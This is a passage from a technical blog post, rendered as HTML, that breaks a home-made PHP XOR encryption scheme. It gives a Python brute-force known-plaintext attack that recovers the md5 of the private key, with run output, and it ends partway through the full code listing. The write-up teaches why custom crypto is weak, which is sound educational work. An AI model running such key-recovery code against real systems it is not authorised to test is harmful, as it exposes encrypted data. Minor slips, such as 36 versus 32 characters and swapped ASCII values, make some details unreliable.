&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="mf"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;XOR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mf"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;XOR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mf"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;XOR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mf"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;XOR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Moreover, by definition: &lt;code&gt;a XOR b XOR a = b&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="breaking-things"&gt;Breaking things&lt;/h2&gt;
&lt;p&gt;In our situation we need to find &lt;code&gt;cipherText&lt;/code&gt; in order to find the md5 hash of
the private key. However &lt;code&gt;cipherText&lt;/code&gt; is build using the clear text and a random
number included between 0 and 32 000. Therefore by a
&lt;a href="https://en.wikipedia.org/wiki/Known-plaintext_attack"&gt;Known-plaintext attack&lt;/a&gt;
we can generate the 32 001 values of &lt;code&gt;cipherText&lt;/code&gt;, XOR it with the encrypted
string, search for the resulting sting which will be repeating every 36
characters and get the md5 hash of the private key. Our only constrain in that
the plain text must be longer than 36 characters in order to easily find the md5
hash (an other option might have be to search for ascii characters).&lt;/p&gt;
&lt;p&gt;Here is the python code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;def&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;brute&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;this is a test in order to break some home made crypto&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;codedText&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;32001&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)).&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;]+&lt;/span&gt;&lt;span class="n"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;result&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;codedText&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;result&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;codedText&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;result&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;]==&lt;/span&gt;&lt;span class="k"&gt;result&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;l+32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;result&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;:32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I put the two function in a file, added a main and run it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@eridani ~&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;time&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;23467&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;e10adc3949ba59abbe56e057f20f883e&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nc"&gt;real&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;m2&lt;/span&gt;&lt;span class="mf"&gt;.186&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;m2&lt;/span&gt;&lt;span class="mf"&gt;.186&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;m0&lt;/span&gt;&lt;span class="mf"&gt;.000&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@eridani ~&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;en&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;md5sum&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;e10adc3949ba59abbe56e057f20f883e&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got the md5 hash of the private key. The default key used in the application
was 8 characters long and was use in other algorithms not home made.&lt;/p&gt;
&lt;h2 id="php-character-xor-character"&gt;PHP: character XOR character&lt;/h2&gt;
&lt;p&gt;PHP is doing really funny things, most of you know that.
When analysing the original PHP code of the encryption function, I found
something very strange:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;$tmp .= mb_substr($text, $i, 1) ^ mb_substr($key, $j, 1);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;How can you make a xor operation between two characters?!&lt;/p&gt;
&lt;p&gt;In fact PHP make a xor operation between the ASCII value of the character and
convert the result back to the ASCII character. For instance &lt;code&gt;'a' xor 'B'&lt;/code&gt; will
result in &lt;code&gt;65 xor 98&lt;/code&gt; which give &lt;code&gt;35&lt;/code&gt; therefore &lt;code&gt;'a' xor 'B' → '#'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As you may have seen in the above code this is equivalent to the following
python code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="full-code"&gt;Full code&lt;/h2&gt;
&lt;p&gt;The complete code is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;randint&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;privateKey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;32000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
